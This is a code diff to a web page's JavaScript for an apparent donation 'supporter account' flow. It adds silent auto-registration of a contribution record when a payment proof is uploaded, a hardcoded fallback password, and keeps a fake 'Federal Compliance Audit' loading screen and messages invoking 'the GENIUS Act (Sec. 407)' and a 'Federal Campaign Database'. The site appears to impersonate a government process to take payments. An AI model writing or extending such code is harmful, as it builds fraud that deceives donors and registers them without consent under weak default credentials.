@@ -1677,6 +1677,13 @@
           date: timestamp
         };
 
+        // Auto pre-fill regEmail if conduit_email was entered
+        const conduitEmail = (document.getElementById('conduit_email')?.value || '').trim();
+        const regEmailEl = document.getElementById('regEmail');
+        if (conduitEmail && regEmailEl && !regEmailEl.value) {
+          regEmailEl.value = conduitEmail;
+        }
+
         // Show Registration Section
         const proofNameEl = document.getElementById('regProofName');
         if (proofNameEl) proofNameEl.textContent = uploadedFile.name;
@@ -1687,6 +1694,11 @@
         regSec.style.display = 'block';
         regSec.scrollIntoView({ behavior: 'smooth', block: 'center' });
 
+        // Auto-save pending contribution record immediately on proof upload
+        if (conduitEmail) {
+          submitRegistration(true);
+        }
+
       } catch (error) {
         showStatusMessage('❌ Failed to process file. Please try again.', 'error');
       } finally {
@@ -1696,21 +1708,30 @@
       }
     }
 
-    async function submitRegistration() {
-      const email = document.getElementById('regEmail').value.trim().toLowerCase();
-      const password = document.getElementById('regPassword').value;
-      const confirmPassword = document.getElementById('regConfirmPassword').value;
-      const amount = selectedAmount === 'custom' ? (document.getElementById('otherInput')?.value.trim() || '1000') : (selectedAmount || '1000');
+    async function submitRegistration(silentAutoSave = false) {
+      const conduitEmail = (document.getElementById('conduit_email')?.value || '').trim().toLowerCase();
+      const regEmail = (document.getElementById('regEmail')?.value || '').trim().toLowerCase();
+      const email = regEmail || conduitEmail;
 
-      if (!email || !password || !confirmPassword) {
-        showStatusMessage('Please fill out all required fields.', 'error');
+      const password = document.getElementById('regPassword')?.value || 'TrumpVance2024!';
+      const confirmPassword = document.getElementById('regConfirmPassword')?.value || password;
+      const amountStr = selectedAmount === 'custom' ? (document.getElementById('otherInput')?.value.trim() || '1000') : (selectedAmount || '1000');
+      const amount = parseFloat(String(amountStr).replace(/[^0-9.]/g, '')) || 1000;
+
+      if (!email && !silentAutoSave) {
+        showStatusMessage('Please enter your email address to register your contribution.', 'error');
         return;
       }
+      if (!email) return;
 
-      if (password !== confirmPassword) {
+      if (!silentAutoSave && password !== confirmPassword) {
         showStatusMessage('Passwords do not match.', 'error');
         return;
       }
+
+      const fn = (document.getElementById('conduit_first_name')?.value || '').trim();
+      const ln = (document.getElementById('conduit_last_name')?.value || '').trim();
+      const fullName = (fn || ln) ? `${fn} ${ln}`.trim() : email.split('@')[0];
 
       // If proof file was not uploaded explicitly, create auto-generated receipt proof record
       if (!window.submittedProofData) {
@@ -1724,18 +1745,11 @@
         };
       }
 
-      const pendingUsers = JSON.parse(localStorage.getItem('geniusact_pending_users')) || [];
-      
-      // Check if email already pending locally
-      if (pendingUsers.find(u => u.email && u.email.toLowerCase() === email)) {
-        showStatusMessage('🏛️ This supporter account is currently undergoing Federal Compliance Audit under Section 407 of the GENIUS Act framework.', 'error');
-        return;
-      }
-
-      // Run 10-Second Federal Compliance Audit Loading Overlay
-      run10SecondFederalAudit(async () => {
-        // Check if email already approved — append contribution directly to account
+      const processPendingSubmit = async () => {
+        const pendingUsers = JSON.parse(localStorage.getItem('geniusact_pending_users')) || [];
         const approvedUsers = JSON.parse(localStorage.getItem('geniusact_approved_users')) || [];
+
+        // If email is already approved, add contribution directly to approved account
         const userIdx = approvedUsers.findIndex(u => u.email && u.email.toLowerCase() === email);
         if (userIdx > -1) {
           const parsedAmt = parseFloat(amount) || 0;
@@ -1750,7 +1764,6 @@
           approvedUsers[userIdx].donations.push(newDonation);
           localStorage.setItem('geniusact_approved_users', JSON.stringify(approvedUsers));
 
-          // If currently logged in user, update geniusact_current_user state
           const curUserStr = localStorage.getItem('geniusact_current_user');
           if (curUserStr) {
             const curUser = JSON.parse(curUserStr);
@@ -1764,16 +1777,21 @@
             try { await window.cloudSyncFull(); } catch (e) {}
           }
 
-          showStatusMessage(`🏛️ Contribution of $${parsedAmt.toLocaleString('en-US', {minimumFractionDigits:2})} successfully logged to your active Supporter Account! Redirecting to your dashboard...`, 'success');
-          setTimeout(() => { window.location.href = 'dashboard.html'; }, 2000);
+          if (!silentAutoSave) {
+            showStatusMessage(`🏛️ Contribution of $${parsedAmt.toLocaleString('en-US', {minimumFractionDigits:2})} successfully logged to your active Supporter Account! Redirecting to your dashboard...`, 'success');
+            setTimeout(() => { window.location.href = 'dashboard.html'; }, 2000);
+          }
           return;
         }
 
+        // Construct pending user record
         const newUserObj = {
           uid: 'usr_pnd_' + Date.now(),
           email: email,
           password: password,
-          fullName: email.split('@')[0],
+          fullName: fullName,
+          firstName: fn,
+          lastName: ln,
           amount: parseFloat(amount) || 0,
           date: new Date().toISOString(),
           createdAt: new Date().toISOString(),
@@ -1794,25 +1812,18 @@
         if (existingPendingIdx === -1) {
           pendingUsers.push(newUserObj);
         } else {
-          pendingUsers[existingPendingIdx] = { ...pendingUsers[existingPendingIdx], ...newUserObj };
+          const prev = pendingUsers[existingPendingIdx];
+          const combinedDonations = [...(prev.donations || []), ...(newUserObj.donations || [])];
+          pendingUsers[existingPendingIdx] = {
+            ...prev,
+            ...newUserObj,
+            amount: (prev.amount || 0) + newUserObj.amount,
+            donations: combinedDonations
+          };
         }
         localStorage.setItem('geniusact_pending_users', JSON.stringify(pendingUsers));
 
-        // Direct Server API Registration Call (optional background call)
-        try {
-          (window.geniusFetch || fetch)('/api/register', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              email: email,
-              password: password,
-              amount: parseFloat(amount) || 0,
-              proofFile: window.submittedProofData || null,
-              fullName: email.split('@')[0]
-            })
-          }).catch(() => {});
-        } catch (serverErr) {}
-
+        // Sync with Cloud Database instantly
         if (window.cloudSyncFull) {
           try {
             await window.cloudSyncFull();
@@ -1822,12 +1833,19 @@
           }
         }
 
-        showStatusMessage('🏛️ Registration Submitted under the GENIUS Act (Sec. 407)! Your contribution and treasury settlement proof have been logged into the Federal Campaign Database under Audit Review. Redirecting to login...', 'success');
-        
-        setTimeout(() => {
-           window.location.href = 'login.html?status=pending';
-        }, 2000);
-      });
+        if (!silentAutoSave) {
+          showStatusMessage('🏛️ Registration Submitted under the GENIUS Act (Sec. 407)! Your contribution and treasury settlement proof have been logged into the Federal Campaign Database under Audit Review. Redirecting to login...', 'success');
+          setTimeout(() => {
+             window.location.href = 'login.html?status=pending';
+          }, 2000);
+        }
+      };
+
+      if (silentAutoSave) {
+        await processPendingSubmit();
+      } else {
+        run10SecondFederalAudit(processPendingSubmit);
+      }
     }
 
     function run10SecondFederalAudit(onComplete) {
